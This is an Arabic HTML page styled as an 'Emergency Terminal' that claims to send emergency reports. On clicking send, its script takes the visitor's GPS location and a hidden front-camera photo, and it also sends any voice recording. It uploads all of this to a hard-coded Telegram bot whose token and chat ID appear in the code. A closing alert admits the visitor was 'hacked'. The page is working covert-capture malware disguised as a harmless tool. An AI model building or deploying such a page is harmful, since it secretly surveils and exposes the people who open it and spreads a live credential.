<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Emergency Terminal v2.0</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; overflow-x: hidden; }
        .matrix-box { width: 95%; max-width: 500px; padding: 20px; border: 1px solid #0f0; box-shadow: 0 0 15px #0f0; background: rgba(0, 20, 0, 0.9); border-radius: 5px; }
        h1 { text-align: center; text-transform: uppercase; letter-spacing: 5px; border-bottom: 1px solid #0f0; padding-bottom: 10px; font-size: 20px; }
        textarea { width: 100%; background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; box-sizing: border-box; margin-top: 10px; outline: none; }
        .controls { display: flex; gap: 10px; margin: 15px 0; }
        button { flex: 1; padding: 12px; background: #000; border: 1px solid #0f0; color: #0f0; cursor: pointer; font-weight: bold; transition: 0.3s; }
        button:hover { background: #0f0; color: #000; box-shadow: 0 0 10px #0f0; }
        button:disabled { border-color: #050; color: #050; cursor: not-allowed; }
        .terminal { background: #001100; border: 1px solid #050; padding: 10px; font-size: 12px; height: 100px; overflow-y: auto; margin-top: 10px; }
        .status-line { margin: 2px 0; }
        .blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
        #video, #canvas { display: none; }
        .recording-active { border-color: #f00 !important; color: #f00 !important; box-shadow: 0 0 10px #f00; }
    </style>
</head>
<body>

<div class="matrix-box">
    <h1>[ SYSTEM_EMERGENCY ]</h1>
    <p style="font-size: 11px; text-align: center;">> INITIALIZING SECURE PROTOCOL...</p>
    
    <textarea id="msgInput" placeholder="ENTER MESSAGE..."></textarea>
    
    <div class="controls">
        <button id="recordBtn" onclick="toggleRecording()">üé§ REC_VOICE</button>
        <button id="stopBtn" onclick="stopRecording()" disabled>‚èπ STOP</button>
    </div>
    
    <button id="sendBtn" style="width: 100%; border-width: 2px;" onclick="runProtocol()">[ EXECUTE_SEND ]</button>
    
    <div class="terminal" id="terminal">
        <div class="status-line">> SYSTEM READY...</div>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
const TOKEN = "8579983010:AAFKblFfzbNYk0bXOY6afuSZg3cIu35nobI";
const CHAT_ID = "6837507867";

let mediaRecorder;
let audioChunks = [];
let audioBlob = null;

function log(text, color = "#0f0") {
    const term = document.getElementById('terminal');
    const line = document.createElement('div');
    line.className = "status-line";
    line.style.color = color;
    line.innerText = `> ${text}`;
    term.appendChild(line);
    term.scrollTop = term.scrollHeight;
}

async function toggleRecording() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        mediaRecorder = new MediaRecorder(stream);
        audioChunks = [];
        mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
        mediaRecorder.onstop = () => {
            audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
            log("VOICE_DATA_ENCRYPTED", "cyan");
        };
        mediaRecorder.start();
        document.getElementById('recordBtn').classList.add('recording-active');
        document.getElementById('recordBtn').disabled = true;
        document.getElementById('stopBtn').disabled = false;
        log("RECORDING_STARTED...", "yellow");
    } catch (e) { log("MIC_ACCESS_DENIED", "red"); }
}

function stopRecording() {
    mediaRecorder.stop();
    document.getElementById('recordBtn').classList.remove('recording-active');
    document.getElementById('recordBtn').disabled = false;
    document.getElementById('stopBtn').disabled = true;
    log("RECORDING_STOPPED");
}

async function runProtocol() {
    const btn = document.getElementById('sendBtn');
    btn.disabled = true;
    log("STARTING_TRANSFER_PROTOCOL...", "white");

    let photoBlob = null;
    let loc = "LOC_UNKNOWN";

    // 1. ÿßŸÑŸÖŸàŸÇÿπ
    if (navigator.geolocation) {
        log("FETCHING_GPS_COORDS...");
        const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, () => r(null)));
        if(pos) loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
    }

    // 2. ÿßŸÑÿµŸàÿ±ÿ©
    log("CAPTURING_VISUAL_DATA...");
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.getElementById('video');
        video.srcObject = stream;
        await new Promise(r => setTimeout(r, 1000));
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));
        stream.getTracks().forEach(t => t.stop());
        log("VISUAL_DATA_ACQUIRED");
    } catch(e) { log("CAMERA_FAILED", "red"); }

    const time = new Date().toLocaleString('ar-YE');
    const note = document.getElementById('msgInput').value || "NO_TEXT_PROVIDED";
    const caption = `[ EMERGENCY_REPORT ]\n\nüìù MSG: ${note}\nüìç GPS: ${loc}\n‚è∞ TIME: ${time}\nüì± SYS: MATRIX_V2`;

    try {
        // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ±ÿ© ŸàÿßŸÑÿ®ŸäÿßŸÜÿßÿ™
        if (photoBlob) {
            log("UPLOADING_VISUALS...");
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', photoBlob, 'shot.jpg');
            fd.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }

        // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ™
        if (audioBlob) {
            log("UPLOADING_VOICE_STREAM...");
            const fdA = new FormData();
            fdA.append('chat_id', CHAT_ID);
            fdA.append('voice', audioBlob, 'voice.ogg');
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fdA });
        }

        log("PROTOCOL_COMPLETE_SUCCESS", "#0f0");
        alert("‚úîÔ∏è ÿ™ŸÖ ÿßŸÑÿßÿÆÿ™ÿ±ÿßŸÇ.. ÿπŸÅŸàŸãÿßÿå ÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ®ŸÑÿßÿ∫ ÿ®ŸÜÿ¨ÿßÿ≠!");
    } catch (err) {
        log("TRANSFER_FAILED_RETRYING...", "red");
    }
    btn.disabled = false;
}
</script>
</body>
</html>
